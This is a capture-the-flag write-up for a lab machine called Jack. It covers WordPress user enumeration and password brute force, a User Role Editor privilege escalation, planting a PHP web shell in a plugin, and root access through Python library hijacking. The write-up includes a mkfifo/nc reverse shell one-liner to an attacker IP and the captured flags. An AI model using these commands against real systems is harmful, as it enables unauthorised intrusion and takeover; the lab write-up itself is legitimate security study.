# Jack

This one was hard. Several new things learned. And I unashamedly used both the tips on the room and light pointers in the right direction from some online sources.

"Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module."

1. Recon showed 22 and 80. Sure enough a wpscan sat on 80.

2. `wpscan` revealed three users: jack, wendy and danny. 

    The hint for the user flag was "Wpscan user enumeration, and don't use tools (ure_other_roles)". This reveals two things: 
    
    First, `ure_other_roles` is a tip to an exploit with the user role editor plugin (which I confirmed was there by navigating to `http://jack.thm/wp-content/plugins/user-role-editor/readme.txt`). The vuln is trivial: when saving a profile in the editor, you can add `&ure_other_roles=administrator` to the post body and it will grant the user admin roles. 
    
    Importantly though, this requires being logged in as a low-priv user. The wpscan user enumeration is typically used with a brute force attack (again using wpscan).

    > At this point I got stuck. But thats okay, because so did everyone else from what I can see. The standard word list you use for bruteforcing is rockyou.txt, but it wasn't working (ran it for two hours, no luck, which is usually a hint your'e going in the wrong direction)
    >
    > I tried several other wordlists from seclists with no luck.
    > 
    > The answer was both simple and a huge surprise. I was convinced that in kali, there is only one file under `/usr/share/wordlists`: rockyou. However, there is *actually a second wordlist there*, `fasttrack.txt`. I was as surprised as everyone else's walkthrough I checked.

3. `wpscan --url jack.thm -U wendy,danny -P /usr/share/wordlists/fasttrack.txt` quickly picked up a password for wendy: `changelater`

4. Once into the site, I used the vulnerability with the user role editor to grant wendy admin rights (used burp to intercept the 'Update Profile' POST, added the extra body param, and forwarded the request on).

5. I replaced the content of the akismet plugin's `index.php` with [p0wny shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php) (probably overkill - could have added a new file or uploaded something), then browsed to `http://jack.thm/wp-content/plugins/akismet/index.php` to get a web shell.

6. In the user directory were two text files: `user.txt` and `reminder.txt`. The first contained the user flag: `0052f7829e48752f2e7bf50f1231548a`

7. The second contained: `Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.`. From this I went looking for backups (`locate backups`) and found a suspicious `/var/backups/id_rsa`.

8. I copied this to my attacker machine, changed its permissions with `chmod 600 id_rsa`, then used `ssh -i id_rsa jack@jack.thm` to log on as jack.

9. The final escalation hint was "Python". From the room description I knew this was a 'python module escalation', which I hadn't heard of before.

    > I did a google and found this article: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/, The whole thing is worth a read, and from it I solved this final challenge.

    > Basically, if a python script you can't edit directly is being run by root, but it imports something that you have the ability to alter either by: 
    >
    > - putting a same named file in any of the search directories python uses for import sources; 
    > - or by editing the module file directly, 
    > 
    > Then you can get code execution by reference.

10. I ran a search (`find / -name "*.py" -user root 2>/dev/null`) to find suspicious files. On the giant results list, the very first file was  suspicious: `/opt/statuscheck/checker.py`. Next to it was an `output.log` containing header information for the wordpress site, updated every two minutes. The `checker.py` file contained:

    ```python
    import os

    os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
    ```

    I could see updates entering the log file every two minutes via `cat /opt/statuscheck/output.log | tail`

11. I couldn't modify the file. Nor could I modify any of the source directories python looked into (I checked this with a little bash scripting: `for path in $(python -c 'import sys; print "\n".join(sys.path)'); do namei -l $path ; done`. note the use of `namei -l` to get a full list of file/folder permissions for each entry). However I did discover that `os.py` under `/usr/lib/python2.7` *WAS* writable (checked via `for path in $(locate os.py); do namei -l $path; done`).

12. Adding a python shell to this proved problematic - python shells typically use functionality *from* `os.py`, after all. Ultimately, the solution was to open `os.py`, go to the bottom, and add a new line: `system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.203.251 4444 >/tmp/f')`. The nice nc reverse shell for when all you have is `nc.openbsd` (as was the case on this machine). I tested this (getting an unpriviliged shell) via `python -c "import os"`

13. Went back to my attacker machine, opened a reverse listener, and within a minute I had a root shell! The final flag at `/root/root.txt` was `b8b63a861cc09e853f29d8055d64bffb`.

Overall a very tough room, but also simple in its individual elements. Things I learned:

- `fasttrack.txt`!
- `ure_other_roles` exploit (worth keeping in mind if I find myself with a low-priv wordpress user)
- clever uses of `locate` and bash scripting. also `namei -l`
- python module privesc :)
